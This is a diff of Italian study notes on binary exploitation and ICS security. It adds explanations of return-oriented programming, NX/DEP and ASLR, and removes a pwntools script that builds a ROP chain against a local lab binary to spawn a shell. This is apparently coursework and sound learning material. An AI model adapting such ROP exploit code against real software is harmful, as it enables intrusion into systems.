@@ -20,42 +20,23 @@ Paper letti e magari citati:
 - [Overview of an industrial control system environment contributes to... | Download Scientific Diagram](https://www.researchgate.net/figure/Overview-of-an-industrial-control-system-environment-contributes-to-this-direction-and_fig1_370224876)
 
 
+---
 
-Exploit per il primo binario ricevuto:
-```python
-from pwn import *
+Estratto dal seguente video: [ROP is DEAD! Kernel Driver Binary Exploitation](https://www.youtube.com/watch?v=mALEQkLegaE)
 
-# addresses of the functions
-exec_string_addr = p32(0x80491b6)
-add_bin_addr = p32(0x80491e5)
-add_sh_addr = p32(0x8049236)
+ROP è un metodo d'attacco di file binari usato per bypassare moderne tecniche di sicurezza, come Data Execution Prevention (DEP: is a security feature that prohibits the application from executing code from non-executable memory area) o NX, ovvero la non eseguibilità dello stack.
 
-# pop instructions
-pop_ret = p32(0x08049022)
-pop_pop_ret = p32(0x08049233)
+A causa di NX non sarebbe possibile sfruttare un buffer overflow per iniettare una shell ed eseguirla, quindi attacchi di questo tipo non funzionerebbero (vedi $W \oplus X$ nel primo paper).
 
-# magic strings
-magic = p32(0xdeadbeef)
-magic1 = p32(0xcafebabe)
-magic2 = p32(0x0badf00d)
+Possiamo però concatenare diversi pezzettini di codice (preesistente nel binario) per eseguire ciò che ci pare attraverso il craft di una ropchain.
 
-arg = b'A' * 112
 
-# craft the payloads
-payload = arg
-payload += add_bin_addr
-payload += pop_ret
-payload += magic
-payload += add_sh_addr
-payload += pop_pop_ret
-payload += magic1
-payload += magic2
-payload += exec_string_addr
+---
 
-bin = "./es"
-p = process([bin, payload])
-# p = gdb.debug([bin, payload], gdbscript="b main\nb *0x80492ba\nr")
+Source - [[1008.4099] Security Mitigations for Return-Oriented Programming Attacks](https://ar5iv.labs.arxiv.org/html/1008.4099)
 
-p.interactive()
-```
+Address Space Layout Randomization (ASLR) as a countermeasure. ASLR renders the layout of an application’s address space less predictable because it relocates the base addresses of executable modules and other memory mappings.
+
+
+
 
